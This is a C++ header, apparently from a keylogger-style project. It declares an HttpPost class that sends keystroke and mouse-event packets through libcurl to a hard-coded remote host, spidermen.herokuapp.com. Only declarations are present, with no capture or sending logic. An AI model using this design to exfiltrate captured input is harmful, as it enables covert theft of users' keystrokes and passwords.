#ifndef _HTTP_HH_
# define _HTTP_HH_

# include <string>
# include <curl/curl.h>
# include "paquetMouse.hh"
# include "paquetKeys.hh"
# include "debug.hh"

# define HOST_NAME	"spidermen.herokuapp.com"
# define PAQUET_KEYS	"/paquet_keys"
# define PAQUET_MOUSE	"/paquet_mouses"

class			HttpPost
{
public:
  HttpPost();
  ~HttpPost();
  bool			postPaquet(PaquetKeys *paquet, const std::string &name);
  bool			postPaquet(PaquetMouse *paquet, const std::string &name);

private:
  std::string		createRequest(PaquetKeys *paquet, const std::string &name);
  std::string		createRequest(PaquetMouse *paquet, const std::string &name);
  CURL			*_curl;
  CURLcode		_res;
};

#endif /* !_HTTP_HH_ */
